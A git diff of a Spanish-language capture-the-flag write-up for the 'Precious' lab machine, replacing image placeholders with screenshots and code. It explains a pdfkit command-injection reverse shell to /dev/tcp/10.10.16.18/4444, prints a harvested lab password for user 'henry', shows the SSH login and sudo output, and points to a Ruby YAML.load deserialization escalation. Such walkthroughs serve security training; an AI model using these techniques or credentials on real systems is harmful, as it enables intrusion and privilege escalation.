@@ -32,7 +32,7 @@ Antes de poder entras tenemos que actualizar nuestro etc/hosts para que la IP ap
 Despues, podríamos entrar en la página.
 
 
-(Imagen)
+![image](https://user-images.githubusercontent.com/109216235/207906514-b59cd9d7-607c-4e39-a5de-cc88c267d635.png)
 
 
 Viendo esto podemos crearnos un servidor con python3 para que nos cree un pdf de nuestro servidor
@@ -41,13 +41,13 @@ Viendo esto podemos crearnos un servidor con python3 para que nos cree un pdf de
 python3 -m http.server 4444
 ```
 
-(Imagen)
+![image](https://user-images.githubusercontent.com/109216235/207906825-45cbd4c1-f7e9-48de-92e8-8053d8e595b7.png)
 
 
 Esto nos generará un pdf. Lo analizamos con "exiftool" y podemos ver que versión de pdfkit se utiliza
 
 
-(Imagen)
+![image](https://user-images.githubusercontent.com/109216235/207907027-277bf2aa-0889-4f7d-9118-127fe9b59a28.png)
 
 
 Buscamos información sobre como injectar comandos en esta máquina. En este sitio https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 encontramos una vulnerbilidad de la que nos podemos aprovechar.
@@ -72,16 +72,16 @@ bash -i: Hace que la revershell sea interacitva
 /dev/tcp/10.10.16.18/4444: crea la revershell cuando se ejecuten
 
 
-(imagen)
+![image](https://user-images.githubusercontent.com/109216235/207907465-d2cdd79e-7a17-4eb0-8fef-2b00fedc3b7c.png)
 
 
 Dentro de la máquina podemos encontrar dentro del usuario "ruby" una carpeta oculta llamada "bundle" que contiene las credenciales de "henry"
 
 
-(imagen)
-
-
-Dentro de la carpeta /home/ de "henry" encontramos la user.txt y ya tendríamos la mitad de la máquina
+```
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+```
 
 
 # [](#header-2) Escalada de privilegios
@@ -90,13 +90,23 @@ Dentro de la carpeta /home/ de "henry" encontramos la user.txt y ya tendríamos 
 Accedemos al ssh con las credenciales de "henry"
 
 
-(imagen)
+```ssh
+ssh henry@10.10.11.189
+henry@10.10.11.189's password:Q3c1AqGHtoI0aXAYFH
+```
+
+Dentro de la carpeta /home/ de "henry" encontramos la user.txt y ya tendríamos la mitad de la máquina
 
 
-Una vez dentro utilizamos ```sudo -l``` para ver que se ejecuta como root
+Utilizamos ```sudo -l``` para ver que se ejecuta como root
 
-(código)
+```ssh
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+```
 
 Buscamos como escalar de privilegios con Ruby YAML.load. En esta página (https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) encontramos una vulnerabilidad. Vemos que si manipulamos el campo git-set podemos escalar de privilegios.
 
